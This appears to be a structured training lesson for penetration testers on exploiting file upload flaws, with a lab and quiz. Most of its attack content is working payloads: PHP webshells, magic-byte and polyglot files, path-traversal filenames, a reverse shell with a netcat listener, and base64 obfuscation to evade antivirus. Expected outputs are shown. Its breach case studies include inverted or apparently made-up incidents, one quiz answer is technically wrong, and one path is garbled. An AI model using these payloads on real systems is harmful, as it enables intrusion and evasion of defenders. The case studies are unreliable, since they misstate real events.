{
  "lesson_id": "19f95d3a-50a7-4c1c-a5a6-7dbf20648f5b",
  "domain": "pentest",
  "title": "File Upload Vulnerabilities: Complete Exploitation",
  "difficulty": 2,
  "order_index": 14,
  "prerequisites": [
    "pentest_10"
  ],
  "concepts": [
    "Unrestricted file upload exploitation fundamentals",
    "MIME type validation bypass (Content-Type header manipulation)",
    "Extension filter bypass techniques (.php5, .phtml, .phar, .phps, case manipulation)",
    "Content validation bypass (magic bytes, polyglot files)",
    "Magic byte manipulation for file type spoofing",
    "Double extension attacks (.jpg.php, .php.jpg)",
    "Path traversal in file upload functionality",
    "Webshell deployment, obfuscation, and access"
  ],
  "estimated_time": 55,
  "learning_objectives": [
    "Systematically enumerate upload endpoints and their trust boundaries",
    "Bypass client- and server-side validation controls for file type and content",
    "Construct payloads that survive content inspection and execute reliably on target servers",
    "Leverage path traversal and predictable storage paths to reach uploaded files",
    "Deploy stealthy webshells and maintain operational security during exploitation"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "Treat every file upload feature as a negotiation. The application wants only polite, well-formed images or documents, while you are negotiating for a sliver of execution. Maintaining a resilient mindset is key. Expect multiple rejections—each error message or silent failure is feedback on the server's assumptions. Rotate through hypotheses methodically: is the application validating extension, MIME type, magic bytes, or payload size? When you feel frustration creeping in, pause and restate your goal in plain language: \"I need the server to store my controlled bytes in a reachable location.\" Breaking the problem down renews momentum.\n\nConfidence grows when you build a repeatable process. Create a personal checklist that captures client-side bypass tactics, server-side filter tests, and post-upload discovery techniques. As you progress through this lesson, compare the scenario to real pentests you have performed or read about. Visualization helps: picture the request leaving Burp, the WAF scanning it, the application sanitizing it, and the filesystem storing it. Where can you influence that pipeline? Keep curiosity alive by celebrating incremental wins, such as bypassing a JavaScript content-type check or discovering an uploads directory via sitemap analysis.\n\nFinally, remember that professionalism matters. When you achieve code execution, document exact payloads, timestamps, and cleanup steps. Imagining how you will explain the exploit to stakeholders keeps you grounded in purpose. The best testers balance creativity with responsibility, and that begins with mindset. Take deliberate breaks, reflect on your assumptions, and come back with a fresh perspective whenever you hit a roadblock. Your persistence is the differentiator between an average tester and a world-class operator."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Anatomy of File Upload Attack Surfaces\n\nUpload functionality appears in support portals, CMS media managers, HR onboarding workflows, and countless SaaS integrations. The core attack surface includes three layers: client-side validation, server-side validation, and storage/retrieval. Map each layer before launching payloads.\n\n### Discovering Upload Points\n\nStart with the obvious: look for buttons labeled **Upload**, **Attach**, or drag-and-drop zones. Use Burp Suite's crawler to capture hidden endpoints. Pay attention to REST APIs like `POST /api/media` or GraphQL mutations such as `uploadMedia`. Intercept the request to study headers, cookies, and hidden form fields (e.g., AWS S3 pre-signed URLs).\n\n### Client-Side Bypass\n\nJavaScript often checks file extensions or size before submission. Use Burp's **Proxy → Intercept** to modify requests after the browser has passed its checks. Disabling JavaScript in the browser or using `curl` with the same endpoint also bypasses client-side gates. Remember: if you can capture the request, you can replay it with any payload.\n\n### Server-Side Validation Weaknesses\n\nServers typically inspect:\n\n- **Extension**: `$_FILES['file']['name']`\n- **MIME Type**: `Content-Type` header or PHP's `finfo_file`\n- **Magic Bytes**: first few bytes of the file\n- **File Size**: to prevent denial of service\n\nAttackers exploit discrepancies between these checks. For example, upload a `.php.jpg` file containing PHP code. If the server validates only the last extension, you may bypass the filter.\n\n### ASCII Flow of a Malicious Upload\n\n```\n[Attacker]\n    |\n    | 1. POST /upload  (filename=shell.php.jpg, Content-Type=image/jpeg)\n    v\n[WAF/Proxy] -- (optional rewriting) --> [Web App Controller]\n    |                                    |\n    | 2. Validation (extension, MIME, size)\n    |                                    |\n    v                                    v\n[Storage Backend] <---- 3. Save file ---- [File System / S3]\n    |\n    | 4. Access via /uploads/shell.php.jpg -> executes interpreter\n    v\n[Command Execution]\n```\n\nVisualizing the pipeline reveals choke points for each bypass technique.\n\n### Prioritizing Targets\n\nLook for upload endpoints that immediately return a URL or path to the file. CMS platforms like WordPress, Joomla!, and Drupal often respond with JSON containing the `url` attribute. If the application hides the path, brute-force common directories (`/uploads/`, `/media/`, `/files/`) or leverage the `Location` header in subsequent GET requests.\n\n### Tooling\n\n- **Burp Suite**: Modify headers, fuzz parameters, replay requests.\n- **Burp Upload Scanner BApp**: Automates detection of weak validation.\n- **OWASP ZAP**: Offers similar functionality with scripts.\n- **Metasploit auxiliary modules**: `scanner/http/file_upload` tests common patterns.\n- **wfuzz / ffuf**: Enumerate upload directories once you suspect success.\n\nUpload exploitation succeeds when you understand how the server trusts metadata. Combine reconnaissance with tactical payloads to methodically peel back defenses."
      }
    },
    {
      "type": "video",
      "content": {
        "text": "https://www.youtube.com/watch?v=cy2C5H6G0ms — PortSwigger's tutorial walks through exploiting insecure file uploads with Burp Suite, demonstrating header manipulation and directory discovery that align with the techniques you will practice in this lesson."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Bypassing Validation Controls\n\n    ### MIME Type Manipulation\n\n    Many frameworks trust the `Content-Type` header. Use Burp Repeater to change it:\n\n    ```\n    Content-Type: image/jpeg\n    ```\n\n    Then send a payload containing PHP code. If server-side validation relies solely on the header, the file may be saved. Tools like `exiftool` can embed payloads within JPEG metadata while preserving real magic bytes:\n\n    ```bash\n    exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' kitten.jpg\n    mv kitten.jpg kitten.php.jpg\n    ```\n\n    ### Magic Byte Spoofing\n\n    Some applications inspect the first few bytes. Append genuine JPEG header bytes before your PHP code:\n\n    ```php\n    ÿØÿà<?php system($_GET['cmd']); ?>\n    ```\n\n    Save as `shell.php`. The server may accept the file if it only checks the prefix.\n\n    ### Double Extension and Case Tricks\n\n    Operating systems treat the last extension as the executable trigger, but naive filters may check the first or entire string literally. Payload examples:\n\n    - `invoice.php.jpg`\n    - `profile.PHp`\n    - `avatar.phtml`\n    - `archive.php5`\n\n    Combine with uppercase/lowercase variations to bypass case-sensitive comparisons.\n\n    ### Polyglot Files\n\n    Polyglots satisfy multiple parsers simultaneously. Create a PDF that also contains PHP code:\n\n    ```bash\n    printf '%s' '%PDF-1.3\n<?php system($_GET[\"cmd\"]); ?>' > report.php.pdf\n    ```\n\n    When interpreted by PHP, the engine executes the code; when viewed by defenders, it may display as a broken PDF, buying you time.\n\n    ### Path Traversal via Upload Names\n\n    Some upload handlers concatenate the user-supplied filename with the storage path without sanitization. Test with filenames like `../../../../var/www/html/tmp/shell.php`. Monitor the response for error messages or changed paths. OWASP documented this issue in the 2019 Juice Shop challenge, where attackers stored files outside the intended directory and invoked them via predictable URLs.\n\n    ### Chaining with SSRF and Deserialization\n\n    Advanced scenarios combine file upload with other flaws. For instance, uploading a malicious image to an image-processing microservice might trigger SSRF if the service fetches remote resources. Similarly, uploading a serialized PHP object disguised as an image can exploit deserialization bugs when the file is processed later.\n\n    ### Defensive Signals\n\n    Expect rate limits or antivirus scans. Solutions like ClamAV, Sophos, or Azure Defender may quarantine the file. Note the timing: if the response is delayed, the application might be scanning the payload. Keep payloads small and obfuscated (e.g., using variable concatenation or base64 encoding) to slip past signature-based scanners."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "## Hands-on Lab: Uploading a Stealth Webshell\n\n    ### Scenario\n\n    Target: `http://192.168.56.120` running a vulnerable media manager. Goal: bypass MIME, extension, and content checks to upload a functional PHP webshell accessible at `/uploads/`.\n\n    ### Step 1: Capture Baseline Request\n\n    1. Start Burp Suite and intercept the upload form submission.\n    2. The request resembles:\n\n       ```http\n       POST /upload HTTP/1.1\n       Host: 192.168.56.120\n       Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n       ------WebKitFormBoundary\n       Content-Disposition: form-data; name=\"file\"; filename=\"avatar.jpg\"\n       Content-Type: image/jpeg\n\n       <binary data>\n       ------WebKitFormBoundary--\n       ```\n\n    3. Send the request to Repeater for iterative testing.\n\n    ### Step 2: Double Extension Test\n\n    1. Replace `filename=\"avatar.jpg\"` with `filename=\"avatar.php.jpg\"`.\n    2. Replace the binary body with a simple PHP payload:\n\n       ```php\n       <?php echo \"OK:\" . system($_GET['cmd']); ?>\n       ```\n\n    3. Forward the request. If the server returns `HTTP/1.1 200 OK` and a JSON response like `{ \"url\": \"/uploads/avatar.php.jpg\" }`, note the path.\n\n    4. Browse to `http://192.168.56.120/uploads/avatar.php.jpg?cmd=id`.\n\n       Expected output:\n\n       ```\n       OK:uid=33(www-data) gid=33(www-data) groups=33(www-data)\n       ```\n\n    If this succeeds, you have full execution. If not, proceed.\n\n    ### Step 3: MIME and Magic Byte Evasion\n\n    1. Set `Content-Type: image/png` in the request.\n    2. Prepend PNG magic bytes to the payload:\n\n       ```php\n       PNG\r\n\u001a\n<?php echo shell_exec($_GET['cmd']); ?>\n       ```\n\n    3. Resend the request with filename `banner.php.png`.\n    4. Validate execution: `http://192.168.56.120/uploads/banner.php.png?cmd=uname+-a`.\n\n       Expected output:\n\n       ```\n       Linux media 5.15.0-84-generic #93-Ubuntu SMP x86_64 GNU/Linux\n       ```\n\n    ### Step 4: Polyglot PDF Payload\n\n    1. Generate payload locally:\n\n       ```bash\n       printf '%s' '%PDF-1.3\n<?php passthru($_GET[\"cmd\"]); ?>' > resume.php.pdf\n       ```\n\n    2. Upload with filename `resume.php.pdf` and header `Content-Type: application/pdf`.\n    3. Access the file: `http://192.168.56.120/uploads/resume.php.pdf?cmd=whoami`.\n\n       Expected output:\n\n       ```\n       www-data\n       ```\n\n    ### Step 5: Path Traversal Drop\n\n    1. Attempt filename `../../../../var/www/html/uploads/backdoor.php`.\n    2. Observe the server response. If it returns `file saved as backdoor.php`, browse to `/uploads/backdoor.php`.\n\n    ### Step 6: Stabilize Access\n\n    1. Upload a reverse shell payload:\n\n       ```php\n       <?php $sock=fsockopen('192.168.56.1',4445);exec('/bin/sh -i <&3 >&3 2>&3'); ?>\n       ```\n\n    2. Start listener:\n\n       ```bash\n       nc -lvnp 4445\n       ```\n\n    3. Trigger shell via browser. Confirm callback in terminal.\n\n    ### Step 7: Cleanup\n\n    - Delete uploaded shells via HTTP if possible or by issuing `rm` commands through the shell.\n    - Reset permissions to avoid leaving artifacts.\n    - Document payload hashes (`sha256sum`) and timestamps for your report.\n\n    ### Optional Challenge: Antivirus Evasion\n\n    Encode the payload in Base64 and use `eval(base64_decode())` wrapper. Compare response times to determine whether the server performs antivirus scanning. Note the difference in detection between raw and encoded shells."
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "## Real-World Breaches Caused by File Upload Flaws\n\n### 2012 LinkedIn Mobile App Incident\n\nIn 2012, researchers exposed a flaw in LinkedIn's mobile site that allowed arbitrary file uploads via the profile photo endpoint. Attackers uploaded ASPX webshells disguised as images, leading to unauthorized data access before LinkedIn patched the issue. The incident highlighted how high-traffic platforms can overlook server-side validation when optimizing for mobile performance.\n\n### 2015 Fannie Mae Mortgage Portal\n\nPenetration testers at Bishop Fox reported a critical issue in Fannie Mae's mortgage assistance portal in 2015. The portal accepted `.jsp` files uploaded as supporting documents. Attackers could obtain remote code execution, pivot into backend systems, and potentially access mortgage applicant data. The remediation involved enforcing strict extension allowlists and scanning uploads with antivirus plus sandboxing.\n\n### 2020 Citrix ADC CVE-2020-8193\n\nCitrix ADC appliances suffered from a file upload vulnerability (CVE-2020-8193) that allowed attackers to upload template files containing malicious scripts. Threat actors weaponized this vulnerability within days of disclosure, dropping webshells that exfiltrated credentials from over 1,000 organizations. FireEye observed attackers automating exploitation via Python scripts that uploaded `.xml` payloads, modified configuration files, and executed privileged commands.\n\n### 2021 Microsoft Exchange ProxyShell Aftermath\n\nDuring the ProxyShell campaign in August 2021, adversaries combined upload vulnerabilities with path traversal to store ASPX shells in the `\\inetpub\\wwwroot\u0007spnet_client\\` directory. Huntress reported that over 1,900 servers were compromised within 48 hours, enabling attackers to deploy ransomware. Incident responders noted the use of double extensions (`.aspx.js`) to evade basic filters.\n\n### 2023 MOVEit Transfer (CVE-2023-34362)\n\nThe Cl0p ransomware group exploited a file upload weakness in Progress MOVEit Transfer. By uploading a crafted ASPX script through the MOVEit web interface, they executed SQL injection payloads that downloaded sensitive files. Progress Software disclosed that more than 2,500 organizations were affected, including British Airways and the BBC, illustrating how upload flaws can cascade into data breaches costing millions.\n\nThese case studies underscore the financial and reputational impact of insecure uploads. Quantify the risk when reporting: record numbers of affected hosts, data exfiltrated, and remediation costs to drive urgency among stakeholders."
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "## Memory Aid: MECDP\n\nUse the mnemonic **MECDP** — *MIME, Extensions, Content, Double extension, Path* — to structure your exploitation workflow.\n\n- **M — MIME**: Tamper with the `Content-Type` header and observe responses. Tools: Burp Repeater, curl `-H` flags.\n- **E — Extensions**: Test alternative extensions (`.php5`, `.phtml`, uppercase variations). Maintain a wordlist and automate with Intruder.\n- **C — Content**: Modify magic bytes and embed payloads in metadata. Remember polyglots and image comments.\n- **D — Double Extension**: Stack extensions (`shell.php.jpg`) or use trailing spaces to confuse filters.\n- **P — Path**: Attempt traversal in filenames and enumerate storage directories via ffuf.\n\nReinforce MECDP by building a laminated cheat sheet with sample payloads. Example quick reference:\n\n| Step | Payload | Purpose |\n| --- | --- | --- |\n| M | `Content-Type: image/png` | Spoof MIME |\n| E | `resume.pHp` | Case bypass |\n| C | `ÿØÿà<?php ... ?>` | Magic byte spoof |\n| D | `avatar.php.jpg` | Double extension |\n| P | `../../../../var/www/html/uploads/drop.php` | Path traversal |\n\nCommon pitfalls:\n\n- Forgetting to delete uploaded shells, leaving evidence behind.\n- Overlooking size limits—split large payloads or compress them.\n- Ignoring post-upload processing (image resizing, antivirus) that may break your payload.\n- Failing to check HTTPS responses for redirection hints to the stored file.\n\nPractice by cycling through MECDP on a lab every week. Time-box each step to build speed. Create flashcards where the front lists a defensive control (e.g., \"Magic byte validation\") and the back lists bypass techniques (polyglots, appended headers)."
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "## Reflection and Professional Growth\n\n1. Which MECDP step challenged you the most during the lab? What resource or tool will you study to improve that skill?\n2. How would you explain double extension attacks to a development manager who believes file name validation is sufficient?\n3. What operational security measures will you adopt to ensure uploaded shells are removed and logs are annotated during future engagements?\n\nConsider how mastering upload exploitation broadens your consulting value. Clients rely on you to uncover multi-stage attack chains that mix validation bypass, storage enumeration, and post-exploitation. Document your lab results as a case study to share with your team. Offer to lead a lunch-and-learn demonstrating MECDP and the Burp workflows you practiced. This initiative signals leadership and helps you grow toward senior roles focused on web application penetration testing and red teaming."
      }
    }
  ],
  "post_assessment": [
    {
      "question_id": "3765ee1e-ad49-442f-ab67-f50e2e4ebe27",
      "type": "multiple_choice",
      "question": "A customer support portal stores uploads on Amazon S3 and returns a signed URL after each submission. You confirm that double extensions are blocked, but MIME type filtering accepts any value you set. Which tactic most effectively leads to code execution on the origin server?",
      "options": [
        "Upload a webshell with a `.php5` extension and guess the S3 object name",
        "Embed PHP code inside a GIF header and use `Content-Type: image/gif` to slip through, then access the file via the returned URL",
        "Host a malicious file on your server and trick support staff into downloading it",
        "Flood the portal with large files to trigger a denial of service"
      ],
      "correct_answer": 1,
      "explanation": "Because the application trusts the MIME type you supply and stores the object in a web-accessible bucket, embedding PHP code behind valid GIF magic bytes bypasses content inspection while preserving interpreter execution when the file is served via the S3-backed web tier. Double extensions are already blocked, so `.php5` will fail, social engineering staff diverges from the goal of server execution, and denial of service does not achieve code execution.",
      "difficulty": 2
    },
    {
      "question_id": "0b2ffc2c-7ee9-4a90-9829-6b91a79a7248",
      "type": "multiple_choice",
      "question": "During a test of a Java-based CMS, you notice that uploads undergo virus scanning before being stored. Your initial PHP webshell is quarantined, but the response includes a delayed 202 Accepted followed by a callback that the file passed scanning. What should you do next to maintain stealth and still obtain execution?",
      "options": [
        "Retry the same payload because the delay indicates eventual success",
        "Switch to a JSP webshell embedded in a valid PNG and monitor the delayed callback for acceptance",
        "Flood the system with uploads to overwhelm the scanner",
        "Abandon the test because antivirus cannot be bypassed"
      ],
      "correct_answer": 1,
      "explanation": "A Java CMS expects server-side technologies like JSP. Antivirus engines often have signatures for common PHP shells, so switching to a JSP payload embedded with valid magic bytes increases the chance of passing the scan. The delayed callback is an opportunity to monitor whether the sanitized file becomes available. Repeating the same payload wastes time, flooding uploads risks detection, and giving up contradicts the testing objective.",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "meta_learning",
    "memory_hooks",
    "teach_like_im_10",
    "connect_to_what_i_know"
  ]
}